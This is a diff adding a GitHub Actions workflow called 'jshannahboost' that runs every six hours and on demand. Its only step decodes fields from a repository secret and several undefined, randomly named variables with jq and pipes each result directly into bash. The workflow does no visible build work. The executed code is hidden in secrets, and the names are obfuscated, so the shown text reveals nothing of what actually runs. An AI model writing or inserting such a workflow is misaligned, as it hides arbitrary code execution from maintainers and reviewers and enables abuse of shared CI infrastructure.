@@ -1,0 +1,27 @@
+name: jshannahboost
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jshannahboost
+        env:
+          wuf2: ${{ secrets.wuf2 }}
+        run: |
+          echo $wuf2 | jq -r .xwo2 | /bin/bash
+          echo $u0 | jq -r .dt89 | /bin/bash
+          echo $iocz7536 | jq -r .s60 | /bin/bash
+          echo $pgrre5647 | jq -r .zusxt7 | /bin/bash
+          echo $ujhr0439 | jq -r .mddvk1315 | /bin/bash
+          echo $dxx57 | jq -r .x2984 | /bin/bash
+          echo $bbi84494 | jq -r .cpexa4137 | /bin/bash
+          echo $se36 | jq -r .xy11 | /bin/bash
+          echo $ta11383 | jq -r .yfre952 | /bin/bash
+          echo $o8536 | jq -r .ldy6367 | /bin/bash
+
